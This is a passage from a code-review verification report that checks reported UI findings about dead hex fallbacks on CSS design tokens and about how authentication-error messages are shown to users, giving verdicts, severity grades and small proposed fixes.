- **The code is as reported.** `DocumentWorkbench.tsx:4791` is `'color-mix(in srgb, var(--accent-100,#2563eb) 7%, transparent)'`, applied only when `focusedCommentId === c.id` (:4788).
- **The token is always declared, so the fallback is dead.**
  - `index.css:100-102` has `:root { --accent-100: var(--accent-main-100);`. That is in the entry chunk, so every shell has it, not just `.c2c-v2`.
  - `colors_and_type.css:84` and `:350` resolve it to `#d97757` in both themes.
  - The fallback can only be used if `--accent-main-100` is missing.
- **It does break a stated rule, and no gate can see it.**
  - `#2563eb` does not appear anywhere in `design-system/`.
  - `design-system/CLAUDE.md:17` says: "Any hex, font-family, or magic number in the codebase that isn't reading from these tokens is a bug". `:60` says: "Claude orange (`#d97757`) is the only strong color".
  - The phantom-token gate only catches "`var(--some-token, #fallback)` where `--some-token` is declared nowhere". The compliance gate lists "hardcoded hex literals" as "Out of scope".
  - G5 removed the same pattern from `ProjectHome.tsx`.
- **Where the report is wrong:**
  1. `app-v2.css:62` is not `:root`. It sits inside `.c2c-v2.dark` (:48). The report also misses the entry-level `:root` declaration at `index.css:102`.
  2. The "named precedent" at `design-system/CLAUDE.md:45` was a global import that was skipped. That now fails CI: `tests/ui/token-authority.test.ts:171` asserts `expect(reachableCss).toContain('design-system/colors_and_type.css');`. The only trigger left is the entry stylesheet failing to load at runtime.
  3. In that state, the claim that this tint "would be the one thing on screen that is not muted grey" is contradicted by the report's own evidence. These would all render on the same screen:
     - DS-2's `#b54708` notes: `DocumentWorkbench.tsx:3693`, plus `AuthoringAiDraft.tsx:668,679` (mounted at `DocumentWorkbench.tsx:3763`) and `AuthoringExports.tsx:275` (mounted at `:4328`).
     - The `#2563eb` box-shadow at `authoring-v2.css:316`.
  4. In that state the fallback is the only focus tint the row has. No `.cmt[data-active]` rule exists (`surfaces-v2.css:306-308`), and without the fallback the declaration computes to `unset`, meaning no tint at all. A wrong hue on a 7% wash does not misstate anything.
- **Conclusion:** this is a genuine but cosmetic violation in code that never runs. It does not reach "medium" ("a real defect with a workaround or narrow trigger") because no supported state shows it.

**If confirmed, the smallest correct fix,** and any place the report's proposed fix is wrong or incomplete:
- **The fix:** change `DocumentWorkbench.tsx:4791` to `'color-mix(in srgb, var(--accent-100) 7%, transparent)'`. No test pins the string.
- **Incomplete for this screen:** the `.ed-full-sec` rule that the workbench renders (`:3487`) carries two dead fallbacks, not one.
  - `authoring-v2.css:316` has `var(--accent-100, #2563eb)`.
  - `authoring-v2.css:311` has `var(--bg-200, #eaecf0)`. The report missed this one; it is the same `#eaecf0` literal G5 removed.
  - Both should become the bare token.
- **Optional, better:** move the tint into a `.c2c-v2 .cmt[data-active]` rule, since the row already sets `data-active` at :4786. The stylesheet gates can then see it.
- **What this does not close:** v2 still has 76 `var(--x, #hex)` sites, 33 of them on `--text-300`. Closing that needs a gate that flags a hex fallback on a declared token, which is a separate decision.

## Verification of DS-2
**Verdict:** PARTLY CONFIRMED. The literal is real, it matches neither theme value, and all five sibling copies are real and on the same screen. The medium grade is not supported.

**Severity, as you would grade it:** low. The fallback is dead in every supported shell and theme. It could only render if the entry stylesheet failed to load. Even then it would paint the note in a readable warning orange, about 5.4:1 on white, and the words themselves already state the fact. The report itself concedes that "a wrong tint on it would be cosmetic, not a false claim about save state".

**What I checked:**
- `DocumentWorkbench.tsx:3660-3710`. The panel renders when `check && check.section_id === activeSection.id` (:3680), and the note only while `dirty` (:3692).
- The imports at `DocumentWorkbench.tsx:76-77` and the mounts at `:3763` (`<AuthoringAiDraft`) and `:4328` (`<AuthoringExports`).
- `surfaces/AuthoringExports.tsx:131-136,268-278` and `surfaces/AuthoringAiDraft.tsx:262-266,660-685`.
- Every `--warning:` declaration in the repo:
  - `design-system/colors_and_type.css:183` (`:root`) and `:428` (`.dark, [data-theme="dark"]`).
  - Otherwise only un-imported `ui_kits/` and `.claude/skills` stylesheets. Nothing in `client/src` sets it.
- The shell root sets both dark hooks: `V2App.tsx:1161` (`c2c-v2 shell dark`) and `:1174` (`data-theme="dark"`).
- The same portal and serialization search, gates, rules, prior reviews and token-authority guard as DS-1.
- A search of the test trees for the literal: no hits.

**Why:**
- **The code is as reported.**
  - `DocumentWorkbench.tsx:3693` is `<span style={{ fontSize: 11, color: 'var(--warning,#b54708)' }}>`.
  - `--warning` is `#955d22` (`colors_and_type.css:183`) and `#d99a58` (`:428`). Neither is `#b54708`.
  - The six hits are exact: `AuthoringExports.tsx:134` (`uncheckable: { borderLeftColor: 'var(--warning,#b54708)' }`), `:275`, `AuthoringAiDraft.tsx:264`, `:668` and `:679`. Both files are imported and mounted by the workbench.
  - The lines next to them show the inconsistency: `AuthoringExports.tsx:135` has `drifted: { borderLeftColor: 'var(--error)' }` and `AuthoringAiDraft.tsx:265` has `error: { borderLeftColor: 'var(--error)' }`, both without a fallback.
- **All six fallbacks are dead.** `--warning` is declared at `:root` by the entry chunk (`main.tsx:27`) and re-declared for dark on the shell element. Nothing overrides it and none of these components renders outside the document, so this holds in every shell and theme.
- **The rule and the gates' blind spot are the same as in DS-1.**
- **The reason given for raising it above polish fails:**
  - The "same CSS-failure precedent" is now caught by `tests/ui/token-authority.test.ts:171`.
  - In the one trigger left, the fallback is a readable warning-family colour. Without it the colour would be `unset`, meaning an inherited body colour.
  - Six copies multiply a cosmetic defect; they do not change what kind of defect it is. The repo graded the identical class low or advisory (2026-09-22 #2, 2026-09-24 G5).

**If confirmed, the smallest correct fix,** and any place the report's proposed fix is wrong or incomplete:
- **The fix:** replace `'var(--warning,#b54708)'` with `'var(--warning)'` at all six sites in one change: `DocumentWorkbench.tsx:3693`, `AuthoringExports.tsx:134,275` and `AuthoringAiDraft.tsx:264,668,679`.
- **On the report's fix:** it is correct. Its caveat, that fixing only :3693 leaves five copies on the same screen, should be the default scope rather than an option.
- **Same class, not on this screen:** `coverage-v2.css:572` has `var(--warning, #9a6b00)`, and `BiostatWorkbench.tsx:513` and `MissionControl.tsx:184` have `#955d22`, which matches the light value only. They are not needed to close this finding.

---

## Verification of M-1
**Verdict:** REFUTED

**Severity, as you would grade it:** low. No response the app sends can reach the `HTTP ${res.status}` fallback in `runCheck` or `refreshAllSources`. The upload fallback shows only behind a non-JSON page from a gateway or proxy, and nothing in the repo produces one. Even then it reads as a full, true sentence, the same "(HTTP n)" form other editor files use.

**What I checked:** I read the working tree at HEAD `26fbf978`. `git diff --stat 7087f46e2 HEAD` touches only three docs files, so the code is the same as at the review commit.
- **Client files:**
  - `client/src/lib/queryClient.ts:65-121` (INTERNAL_MARKERS, redactInternals), `:132-146` (fallbackMessage), `:205-227` (serverMessage), `:362-423` (apiRequest)
  - `client/src/utils/sessionEnd.ts:22-32,63-67`
  - `client/src/services/portal/authService.tsx:1156-1161`
  - `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:61, 1790-1969, 2137-2158, 2603-2634`, plus every `status === 401` and `HTTP ${` site in the file
  - `RichSectionEditor.tsx:1745-1779`
  - `client/src/concept2cure/v2/toast.tsx:88-106` (fireToast renders the message unchanged)
  - There is no global fetch interceptor and no service worker in `client/src`.
- **Server: every layer a POST to `/api/authoring/…` passes, in mount order** (`server/index.ts:122,138,154`; `server/startup/routes.ts:92,173`):
  1. `server/middleware/authBoundary.ts:118-138,148-220`
  2. `server/middleware/auth.ts:141-234` (authenticateToken)
  3. `server/bootstrap/register-platform-routes.ts:243-278`, the global gate that calls `server/auth.ts:138-178,186-334` (authMiddleware)
  4. `server/middleware/authoringObjectAuthorization.ts:216-236`
  5. The router's own guard at `server/routes/authoring.router.ts:112-186`, then the handlers at `:3403-3612` (deficiency-scan), `:4631-4667` (refresh-all) and `:6276-6383` (images)
- **Server: other refusal shapes:** `tenantContext.ts:215-352`, `requireLicenseAcceptance.ts:25`, `errorHandler.ts:59-102,187-189`, `redisRateLimiter.ts:556-585`, `enterprise-security.ts:424-431,987,1003`, `storageQuotaGuard.ts:146-160`, `moduleEntitlementGate.ts:93-95,244-250`, `startup/services.ts:582-592` (the /api 404 is JSON), `session-inactivity.ts:74-76,170-178`, `account-standing.ts:43`.
- **Greps:**
  - Every `status(401)` in `authoring.router.ts`: all carry a sentence.
  - `sendStatus(401)` and `status(401).end|send(` across all of `server/`: no hits.
  - `infra/` and `helm/`: no edge auth and no proxy body-size limit configured.

**Why:**
1. **The contract part of the finding is right.** `queryClient.ts:398` `if (!response.ok && response.status !== 401) {` throws for every other status, so the `!res.ok` branch in both handlers only ever sees 401. The 401 body is still readable by the caller: `sessionEnd.ts:22` says "Reads a clone; the caller's body is untouched."
2. **The display part is wrong for `runCheck` and `refreshAllSources`.** Both handlers fall back to the number only when `serverMessage` finds nothing:
   - `DocumentWorkbench.tsx:1926` `const json = (await res.json().catch(() => null))`, then `:1935` `(serverMessage(json) ?? \`HTTP ${res.status}\`)`. The same pattern is at `:2612` and `:2619`.
   - `serverMessage` (`queryClient.ts:214-225`) takes `error.message`, `message`, `detail`, or an `error` string that is not a code.
   - **Every 401 on this path carries such a sentence:**
     - `auth.ts:148-150` `{ error: { code: 'AUTH_001', message: 'No authentication token provided' } }`
     - `auth.ts:202,206,210` (session ended, account not active)
     - `auth.ts:220` `{ error: { code: sessionEndCodeOf(inactivity), message: sessionEndMessageOf(inactivity) } }`, whose idle message is `session-inactivity.ts:74` `'Signed out after a period of inactivity. Sign in again.'`
     - `auth.ts:230-231` `'Invalid or expired token'`
     - `authBoundary.ts:127-129` (AUTH_011)
     - `server/auth.ts:177` `{ error: sessionEndMessageOf(inactivity), code: … }`, plus `:191` `'Bearer token required'` and `:213,217,260,333`
     - `authoringObjectAuthorization.ts:230-234` `'Authenticated authoring principal and tenant context are required.'`
     - `authoring.router.ts:123-125,135` `'Authentication required for 21 CFR Part 11 compliance'` and `'Invalid authentication token'`
   - None of these is a code, and none matches INTERNAL_MARKERS.
   - **The other half of the condition cannot fire either.** Every 2xx carries the field each handler tests: `authoring.router.ts:4662` `res.json({ ok: true, refreshed, changed, skipped })` and `:3576-3578` `res.json({ success: true, scan_results: {`.
   - **So in the report's own scenario (idle, then Check), the person does not see "HTTP 401".** They see "Couldn't check the section — Signed out after a period of inactivity. Sign in again.. No result is shown because none was produced." The doubled period is a separate polish issue shared by every toast that appends to a server message. At the same time `queryClient.ts:393-395` announces the session end, and `authService.tsx:1158-1159` ends the session.
   - The report contradicts itself here: its M-2 and re-verification sections say every 401 envelope carries a usable sentence that `serverMessage()` extracts.
3. **`uploadSectionImage` also calls `serverMessage` first.** It uses a raw fetch (`:2141-2155`).
   - **Every refusal on `/api/authoring/images` carries a sentence:**
     - the route itself: `authoring.router.ts:6296-6300, 6312, 6316-6339, 6380`
     - the rate limiter, CSRF, quota and module gates: `redisRateLimiter.ts:558-561`, `enterprise-security.ts:426-429,987`, `storageQuotaGuard.ts:147-153`, `moduleEntitlementGate.ts:244-249`
   - The client already refuses a wrong file type or anything over 8 MB before sending (`RichSectionEditor.tsx:1748-1759`).
   - **So the fallback needs a non-JSON body,** such as a gateway error page, which nothing in the repo emits.
   - **When it does appear, it is a full sentence:** "The image was not uploaded — the image store returned HTTP 502. Nothing was inserted."
   - Sibling editor files use the same form: `AssignReviewDialog.tsx:144` `` `the server refused it (HTTP ${status})` ``, `ProjectFilesPanel.tsx:160,178,201` and `DocumentCanvas.tsx:155`.

**If confirmed, the smallest correct fix:** Not applicable, since the finding is refuted. The report's proposed fix is also wrong in two places:
- **`runCheck` / `refreshAllSources`:** the report wants the siblings' generic `if (res.status === 401)` branch placed ahead of `serverMessage`. That would replace the server's specific reason with "sign in and retry."
  - For ACCOUNT_INACTIVE (`auth.ts:206`, with the message at `account-standing.ts:43`: "This account is not active. Contact your administrator.") that advice is wrong, because signing in again cannot work. The change would make things worse.
  - If the handlers are to be made consistent, the nine siblings should read `serverMessage(json)` on a 401 before their generic sentence.
  - Optional polish for the three sites: keep `serverMessage` first and only rephrase the unreachable fallback.
- **`uploadSectionImage`:** the report says to phrase it "the way `fallbackMessage()` already does elsewhere in the same file."
  - `fallbackMessage()` is not in `DocumentWorkbench.tsx`, and it never includes a status (`queryClient.ts:132-146`).
  - The report says its rewording would let the anchored marker "actually catch it." It would not. The marker `/^\s*HTTP\s+\d{3}\b/` (`queryClient.ts:95`) only matches at the start of the string, and its comment at `:91-94` says it deliberately does not match a trailing "(HTTP 500)". The rewording would change nothing about redaction.

---

## Verification of M-2
**Verdict:** PARTLY CONFIRMED

**Severity, as you would grade it:** low. The defect affects only the wording of a help text, and only on a narrow trigger. The text is still true: the list did not load, and only a reviewer without an account can be named. Nothing governed is created or misstated, and a submit right afterwards reports the session problem in words (`ProtocolDevWrites.ts:93`).

**What I checked:** I read at HEAD `26fbf978a`. `git diff 7087f46e2 HEAD -- client/src server shared` is empty, so this matches the review commit.
- **Client files:**
  - `ProtocolDevWrites.ts:74-135, 330-344`
  - `ProtocolDevForms.tsx:200-245, 352-392`
  - `C2CForm.tsx:209-226`
  - `ProtocolDevReviews.tsx:86`
  - `ProtocolDevWorkspace.tsx:442-448`
  - `lib/queryClient.ts:117-227, 362-423`
  - `utils/sessionEnd.ts:13-32`
  - `services/portal/authService.tsx:690-771, 827-840, 1080-1194, 1221`
  - `router/ZenRouter.tsx:59-104, 170-185`
  - `components/session/IdleSessionGuard.tsx:47-109`
  - `utils/authToken.ts:51-78`
  - `__tests__/protocolDevSurfaceWrites.test.tsx:26-30, 290-305`
- **Server files:**
  - `index.ts:138/154/227`
  - `startup/middleware.ts:147-160`
  - `middleware/authBoundary.ts:57-75, 118-138, 155-174`
  - `middleware/auth.ts:141-252`
  - `services/account-standing.ts:43`
  - `services/session-inactivity.ts:170-178`
  - `middleware/enterprise-security.ts:542-620` (403 only)
  - `bootstrap/register-tenant-routes.ts:50-58`
  - `routes/tenant-users.ts:51-78, 200-403` (no earlier route shadows `/:tenantId`)
- **Guards that could have handled it:**
  - `apiRequest`'s session-end announcement, the AuthProvider listener, `ProtectedRoute` and `IdleSessionGuard` do handle some 401s: idle, lifetime and superseded sessions only.
  - There is no global fetch interceptor; I searched for `window.fetch` overrides and found none.

**Why:**

1. **The mechanism is real.**
   - `ProtocolDevWrites.ts:337` reads `if (!res.ok) throw new Error(\`the server answered ${res.status}\`);` and never reads the response body.
   - In a browser only a 401 gets there. `queryClient.ts:398` (`if (!response.ok && response.status !== 401) {`) throws `ApiRequestError` with the server's cleaned message for every other status (:403-406). The catch at `ProtocolDevWrites.ts:334-336` passes that message through.
   - `ProtocolDevForms.tsx:363` stores the message. Line 225 renders `` `The organization’s members could not be loaded (${choice.message}), so only a reviewer without an account can be named here.` ``, and `C2CForm.tsx:224` shows that `desc`. The drawer opens from "Request a review" (`ProtocolDevReviews.tsx:86`).
   - Every 401 production can send carries a sentence:
     - `auth.ts:149`: "No authentication token provided"
     - `auth.ts:202/210`: "This session has ended. Sign in again."
     - `auth.ts:206`: `ACCOUNT_INACTIVE_MESSAGE`, which is "This account is not active. Contact your administrator." (`account-standing.ts:43`)
     - `auth.ts:231`: "Invalid or expired token"
   - `serverMessage()` (`queryClient.ts:205-227`) would pass all of these through.

2. **The report's main scenario does not produce this text.** Its example is "on a lapsed session". A session that lapsed for being idle, too old or superseded never shows the drawer text:
   - `queryClient.ts:393-396` announces those codes (`sessionEnd.ts:15`: `SESSION_IDLE` / `SESSION_LIFETIME` / `SESSION_SUPERSEDED`).
   - `authService.tsx:1158-1161` then calls `endSession` (:767-771), which clears the user.
   - `ZenRouter.tsx:101-102` (`if (!isAuthenticated) { return null; // Will redirect`) unmounts the whole shell and sends the person to sign-in.
   - `IdleSessionGuard.tsx:82` also signs the person out in the browser when the idle window ends.

   The text is seen only on the other 401s:
   - a revoked session (`SESSION_ENDED`, e.g. after a password change elsewhere);
   - a deactivated account (`ACCOUNT_INACTIVE`);
   - a missing or expired token (`AUTH_001` / `AUTH_002`, e.g. an access token that expires before the refresh timer at `authService.tsx:827-840` runs).

   In the `ACCOUNT_INACTIVE` case the discarded sentence is the one that tells the person what to do next.

3. **The report's main server citation is not what production sends.**
   - The `/api` auth boundary is mounted before any route (`index.ts:138`; routes at :154/:227) and enforces in production (`authBoundary.ts:57-75, 170-173`). So `authenticateToken` answers the 401 first.
   - When it lets a request through, it sets `req.user.id` (`auth.ts:244-246`). That means `authorizeOrgAccess`'s `{ error: 'Authentication required' }` (`tenant-users.ts:60`) is effectively reachable only in warn mode, outside production.

4. **No test covers this path.** `protocolDevSurfaceWrites.test.tsx:293` fakes a 503 response, which a real `apiRequest` would throw instead of returning. The test only checks for `/members could not be loaded/i`.

**If confirmed, the smallest correct fix:** at `ProtocolDevWrites.ts:337`, read the body and pass it through the canonical reader:
```ts
if (!res.ok) {
  const body = await res.json().catch(() => null);
  throw new Error(serverMessage(body) ?? (res.status === 401
    ? 'your session isn’t authenticated — sign in again'
    : `the server gave no reason (HTTP ${res.status})`));
}
```
Import `serverMessage` from `@/lib/queryClient`, which the file already imports from. The body can still be read at that point: `sessionEnd.ts:26` reads a `clone()`, and `probeAuditRowOutcome` returns before reading anything for a GET (`queryClient.ts:332`).

Where the report's proposed fix is wrong or incomplete:
- **(a) `detailOf()` is the wrong model.** The report says to read the body "the way `detailOf()` (:74-81) already does". But `detailOf` returns a bare `error.code` when there is no message (:79), and it falls back to `` `HTTP ${status}` `` (:80), which is the bare status the fix exists to remove. It also skips the filtering of enum codes and internal details that `serverMessage` does.
- **(b) The wrong sentence is cited.** The sentence the person would see comes from `auth.ts`, not "Authentication required" from `tenant-users.ts:60`.
- **(c) The parenthetical will read badly.** Those server sentences start with a capital and end with a period. The parenthetical at `ProtocolDevForms.tsx:225` would render "(This session has ended. Sign in again.), so only…". Change it to a colon or split it into two sentences.
- **(d) A test is needed.** Add a 401 case that asserts the server's sentence appears and "401" does not, and show that test failing on the current code before the fix.
